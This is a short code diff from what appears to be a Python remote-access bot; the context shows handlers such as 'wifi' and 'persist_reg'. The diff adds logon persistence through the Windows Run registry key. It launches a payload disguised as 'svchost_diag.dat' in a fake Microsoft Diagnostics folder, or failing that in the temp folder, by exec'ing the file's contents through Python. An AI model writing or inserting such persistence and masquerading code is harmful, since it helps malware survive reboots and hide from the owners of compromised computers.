@@ -871,8 +871,15 @@ async def wifi(ctx):
 async def persist_reg(ctx):
     try:
         exe = sys.executable
-        script = os.path.abspath(__file__) if "__file__" in dir() else os.path.join(tempfile.gettempdir(), "sys_service.py")
-        value = f'"{exe}" -W ignore "{script}"'
+        _cand = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Windows", "Diagnostics", "svchost_diag.dat")
+        if "__file__" in dir() and os.path.exists(__file__):
+            script = os.path.abspath(__file__)
+            value = f'"{exe}" -W ignore "{script}"'
+        elif os.path.exists(_cand):
+            value = f'"{exe}" -W ignore -c "exec(open(r\'{_cand}\', encoding=\'utf-8\').read())"'
+        else:
+            _fallback = os.path.join(tempfile.gettempdir(), "svchost_diag.dat")
+            value = f'"{exe}" -W ignore -c "exec(open(r\'{_fallback}\', encoding=\'utf-8\').read())"'
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE)
